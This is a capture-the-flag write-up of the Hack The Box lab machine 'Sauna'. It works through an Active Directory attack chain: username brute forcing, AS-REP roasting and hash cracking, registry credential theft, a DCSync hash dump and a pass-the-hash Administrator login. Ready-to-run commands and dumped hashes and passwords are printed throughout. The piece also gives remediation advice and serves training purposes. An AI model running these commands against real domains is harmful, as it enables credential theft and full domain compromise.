---
title: "Sauna - HTB Writeup"
header:
  teaser: /assets/images/2023-01-31-Sauna-HTB-Writeup/Sauna-HTB-Image.png
  header: /assets/images/2023-01-31-Sauna-HTB-Writeup/Sauna-HTB-Image.png
  og_image: /assets/images/2023-01-31-Sauna-HTB-Writeup/Sauna-HTB-Image.png
excerpt: "Sauna is an Active Directory server with a web service and DNS served onto the local network. After utilizing brute force username enumeration with a pre-authentication scanner an attacker can identify valid users on the target environment. One user with pre-authentication disabled is using a weak password allowing a remote attacker to perform an AS-REP roast on the domain and gain a user session on the target machine."
tags: [htb, writeup, sauna]
---
## Sauna - High Level Summary

Sauna is an Active Directory server with a web service and DNS served onto the local network. After utilizing brute force username enumeration with a pre-authentication scanner an attacker can identify valid users on the target environment. One user with pre-authentication disabled is using a weak password allowing a remote attacker to perform an AS-REP roast on the domain and gain a user session on the target machine. Stored credentials on the machine's registry allow the user to escalate to a service account with DCSync rights. After dumping the domain's password hash database the attacker is able to successfully emulate an Administrator session on the target machine.

### Recommendations

- Apply the latest security patches to the target server, specifically KB4601318
- Perform a password audit on the target domain
- Perform a privilege audit on the target domain
- Enable two factor authentication wherever it is possible

## Sauna - Methodologies

### Information Gathering

#### Nmap Port Scan

Nmap performs port scanning to detect services exposed to the network on the target server. Since ports 88, 389, and 464 are all exposed to the local network we can assume that this is a Microsoft Active Directory server. This server also appears to be serving the local network with DNS as port 53 is also open.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195657.png)

#### Nmap LDAP Scan

Nmap can also perform scripted scans for specific services. An LDAP scan can be run to enumerate the domain further. The Active Directory server appears to be for the domain `EGOTISTICAL-BANK.LOCAL` running with many default configurations. Some of the most relevant results are noted below.

```bash
ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195658.png)

### Service Enumeration

#### HTTP Service Enumeration

The domain controller is also running a web service on it. This is highly discouraged in a modern network as it is always best practice to segregate services across multiple servers and networks. Investigating the web service further shows that it is just a template site that might be running on top of a CMS that we can exploit. The contact form on the website does not work, returning a 405 code when information is submitted. The only other information revealed on the site is a list of potential users that might be a part of the domain in the 'About Us' section of the site.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195659.png)

### Penetration

#### CVE 2020-1472 ZeroLogon (Easy Win)

The target system is vulnerable to ZeroLogon, a nasty CVE that can allow a remote attacker on the local network to dump the entire Active Directory password database in the form of usernames and hashes. An example of how to perform this on the target machine is shown below, but we will try to complete the box in a different manner as I have already covered this CVE in my [Forest Guide](https://thadigus.gitlab.io/htb-writeups/2023-01-29-Forest-HTB-Writeup/).

[ZeroLogon Exploitation Script](https://github.com/dirkjanm/CVE-2020-1472)

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195660.png)

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195661.png)

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195662.png)

#### Kerbrute Username Brute Forcing

Our LDAP scan using nmap leaked useful information to us about the structure of the domain. Using this Information, we can use Kerbrute to brute force some valid usernames out of the domain.

[Kerbrute GitHub Repository](https://github.com/ropnop/kerbrute)

#### Kerbrute Installation Steps and Usage

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
cd dist
./kerbrute_linux_amd64
```

`./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`

#### AS-REP Roasting Users

Now that we have a list of usernames we can perform standard Active Directory attacks such as AS-REP roasting, a form of Kerberoasting. Be aware that this is a very loud action and Microsoft has documented its attempts to detect and prevent this action in Microsoft Defender for Identity [here](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/helping-protect-against-as-rep-roasting-with-microsoft-defender/ba-p/2244089). Another great cheat sheet for AS-REP roasting is on [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast).

Kerbrute automatically performs AS-REP attacks on any users that have pre-authentication disabled. Because of this, the output provides a list of valid users and, on some occasions, provides us with their password hashes for offline cracking as shown below.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195663.png)

```bash
2023/01/31 20:33:08 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:b05b1f33b7fb5f2b72615f34d776f17b$174d19fed76c4da902c9bcbe563a2fc9eb327b5fb2608f662aa861447a9807864d2c467c79f2845045bfed487359101366c34def51ddd42b19f374e36dedc27d0b1a0157de742e7d088bdb92921baef9376dbb0d316e808ffc4de24d815e3c9e74a919d232099d32bd78b9d0ba0e326e8083ea00fd81f803f7b44235488e87676e5acaeaeb2b6fa0aa979c9a0be6d65d928beec81e93841a67b1ab9076c99615dd659553e48a5b7151f43884dbc4aac72970fb2de282f3f729606d6ae327ef4f975c282e064e229d215baeb1c069af81048bccc26a2a05e2f0becfb0101d11faa6bf8ae9ccbcfabe636c89d7e96b9427ae1e6b54ffd8e0f840114afd1ef63aecae5619a0e52211b382cdd0554a3f36574912642ab741                                                                                                                                                                                                       
2023/01/31 20:33:08 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/01/31 20:36:52 >  [+] Fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$Fsmith@EGOTISTICAL-BANK.LOCAL:9b5b3e2a4a25af414e50c5d7c671a931$89c49eb6655a94c435c9dc1bf0845f2f20f183c709eb75672cfab17f196471382035cda4b2114086bea438b422b31c8839bc79df52cd7fd6e7eeff8c7d06a907f1b347077d6c3b67304406d0c09f66c44d3cd6ebe13ddde9d79dc302d6f69b0bf78250a783c45cacb4e64a55ceafc08b110b7d0dfc72c58b946175480fc302e1ed645f52f59aa34909ab434c982e6305788b56a1e8c88a600e9d6dfceb3554ac93a02e570a16cfb140b35de0195109463a9b1085ae9356ae8fee7dcca941db847968a72828e2fbea86402f345cfcc0e96d0890c662c59fbdc2ddf51810d864a27e2eec24772e7a42c67e7d7cca5b472c06f391b8c04d9c1c4687214bc61bcd8fa61e6fb8b4a9da7fa5570a1964f3a149da170b4c74fd 
```

#### AS-REP Hash Cracking

Even though we have the hash from Kerbrute I was struggling to get Hashcat to crack it. So we can use [Impacket](https://github.com/fortra/impacket) to perform an AS-REP attack for us and automatically output it into the correct format.

```bash
git clone https://github.com/fortra/impacket.git
python3 -m pip install ./impacket/
echo 'fsmith' > asrep-user.txt
python3 ./impacket/examples/GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.175 -usersfile asrep-user.txt
```

These password hashes can be cracked using tools like Hashcat and JohnTheRipper. I like both of these tools equally so I pick them at random when I use them. Commands for both are shown below.

`hashcat -m 18200 --force -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

Upon cracking the hash we are given the credentials: `fsmith:Thestrokes23`

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195664.png)

#### User Session as fsmtih

The server also has Windows Remote Management (also known as WinRM) setup for remote administration. We can utilize a cracked client called Evil-WinRM to connect to the service with these new credentials. This allows us to create a session on the target machine as the fsmith user.

`evil-winrm -u fsmith -i 10.10.10.175 -p 'Thestrokes23'`

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195665.png)

### Privilege Escalation

#### Stored Credentials

A great cheat sheet for Windows Privilege escalation, if you're ever stuck, is on [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation). One of the common checks to be performed on a machine as a low-level user is to check for [stored credentials](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-credentials) in cleartext. The simple command below will check for credentials stored within the registry. This is not common, but it can be utilized for service accounts.

`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON"`

After querying the registry the output can be large but it's worth noting the `DefaultUserName` and `DefaultPassword` fields to see if there are any stored credentials. As a matter of fact, this box stores a service account's credentials in plaintext in the registry.

`svc_loanmanager:Moneymakestheworldgoround!`

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195666.png)

#### User Session as svc_loanmanager

When we try to use Evil-WinRM on the new account, we find that we are denied access. These credentials do not appear to work on this box.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195667.png)

Further enumeration of the domain as the `fsmith` user shows that there is a similarly named user on the target machine called `svc_loanmgr`. We can try the previous password with this new account to log onto the box over the network instead.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195668.png)

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195669.png)

Now we have a shell as the service account on the target machine.

### Domain Privilege Escalation

Now that we have a service account on the domain, it is relatively common to have significant permissions. Service accounts typically connect other systems into the domain and it is not uncommon for a service account to be granted significantly higher permissions on the domain compared to regular service accounts. To further enumerate the domain we can use [BloodHound](https://github.com/BloodHoundAD/BloodHound), a suite of tools for AD enumeration.

#### SharpHound Data Exfiltration

To start we will have to exfiltrate all of the domain data to which we have access. This can be performed with [SharpHound](https://github.com/BloodHoundAD/SharpHound).  Since the team that makes Bloodhound always keeps the latest build of SharpHound in the BloodHound repository we can take our pick of [delivery options](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors). I am partial to the Powershell option, but sometimes it can be a pain to run so the fool-proof option would be to use the executable binary as shown below.

```bash
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
evil-winrm -u svc_loanmgr -i 10.10.10.175 -p 'Moneymakestheworldgoround!'           
upload ./SharpHound.exe
.\Sharphound.exe -c All
download xxxx.zip
```

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195670.png)

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195671.png)

#### Bloodhound Analysis of Domain Data

```bash
sudo apt install docker.io
sudo xhost +local:$(id -nu)
sudo docker run -it --rm -p 7474:7474 -e DISPLAY=unix$DISPLAY -v '/tmp/.X11-unix:/tmp/.X11-unix' --device=/dev/dri:/dev/dri -v $(pwd):/data --name bloodhound docker.io/belane/bloodhound
```

Click `Upload Data` on the right-hand side and import the zip file that we created with SharpHound. This should load all of the JSON files created by SharpHound into the database so that BloodHound can visualize the domain and perform analysis.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195672.png)

#### DCSync Rights for svc_loanmgr

One of the first analyses that I perform on any domain dump is `Find Principals with DCSync Rights`. This shows all accounts and machines that have permission to sync with the domain controller. As we can see in the output below the svc_loanmgr service account has DCSync rights to the domain. This means that the user has permission to access the entire domain and sync to it as if it was another domain controller, dumping all password hashes in the process.

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195673.png)

#### DCSync Request with svc_loanmgr

Since we have discovered the permission to sync against the domain it is trivial to perform the request necessary to dump the entire domain. Using the [Impacket](https://github.com/fortra/impacket) repository we showcased earlier, we can perform it with the commands below.

```bash
git clone https://github.com/fortra/impacket.git
python3 -m pip install ./impacket
python3 impacket/examples/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

With this request, the following output is obtained.

```bash
┌──(thadigus㉿kali)-[~/HTB/Sauna]
└─$ python3 ./impacket/examples/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d7982110e2effab0df3576bc1232329b9b6a60a58229c8af5611af84422caf84
SAUNA$:aes128-cts-hmac-sha1-96:ffe571ff1515a089853a6b05e6b5316e
SAUNA$:des-cbc-md5:23923eae7cdf4334
[*] Cleaning up...
```

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195675.png)

#### Administrator Session Pass-The-Hash Attack

Now that we have the Administrator account's NT and LM hashes for the network we can simply perform a pass-the-hash attack using Evil-WinRM. When you have the NT hash of an account you can pass it directly into the authentication stream and the server on the other end will never know the difference. For Evil-WinRM this is simply a command line argument in place of the password option. Using the command shown below we can authenticate to the domain controller as the Administrator user on the domain.

`evil-winrm -u administrator -i 10.10.10.175 -H '823452073d75b9d1cf70ebdf86c7f98e'`

![Screenshot](/assets/images/2023-01-31-Sauna-HTB-Writeup/Screenshot_20230131_195674.png)

### Remediation

#### CVE 2020-1472

[Same remediation steps as documented in my Forest Write Up](https://thadigus.gitlab.io/htb-writeups/2023-01-29-Forest-HTB-Writeup/#microsoft-suggested-remediation)
  
#### Privilege Audit of the Domain

Credentials should never be stored in the registry and they should never be stored in clear text. Perform a privilege audit on the domain to ensure that all high-risk accounts, such as accounts with DCSync rights, are utilizing complex passwords and have the least privileges possible for their use. Do not store credentials for a DCSync account on any machines.

#### Password Audit of the Domain

A password audit should be performed on the domain. All accounts with pre-authentication disabled must have very complex passwords that are not crackable by any standard dictionaries. ***Enable Two Factor Authentication Anywhere it is Possible***

### Vulnerability Assessments

|---+---+---+---|
| Vulnerability | Risk Rating | CVSSv3 Score | Description |
|: ----------- :|: ----------- :|: ----------- :|: ----------- |
| ZeroLogon Privilege Escalation | Critical | - | A remote attacker can elevate to domain administrator on the target host due to CVE 2020-1472. |
| Privilege Escalation - Poor Password Storage | Critical | - | Clear text credentials are stored for a DCSync account that users can view. Users can escalate to the domain administrator. |
| Privilege Escalation - Poor Password Complexity | High | - | Unprivileged users can perform an AS-REP roast on the domain and crack the password hash of the `fsmith` account due to a low complexity password. |
